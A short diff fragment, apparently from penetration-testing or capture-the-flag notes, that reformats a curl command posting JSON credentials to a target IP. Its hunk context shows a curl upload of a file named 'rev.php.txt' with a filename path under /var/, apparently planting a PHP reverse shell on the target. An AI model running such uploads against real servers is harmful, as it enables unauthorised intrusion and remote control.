@@ -7,8 +7,5 @@ curl -X POST "$TARGET_URL/file-upload" -F "file=@rev.php.txt" -F "filename=/var/
 
 
 ```bash
-curl --header "Content-Type: application/json" \
-  --request POST \
-  --data '{"username":"xyz","password":"xyz"}' \
-  http://$TARGET_IP
+curl --header "Content-Type: application/json" --request POST -d @data.json http://$TARGET_IP
 ```
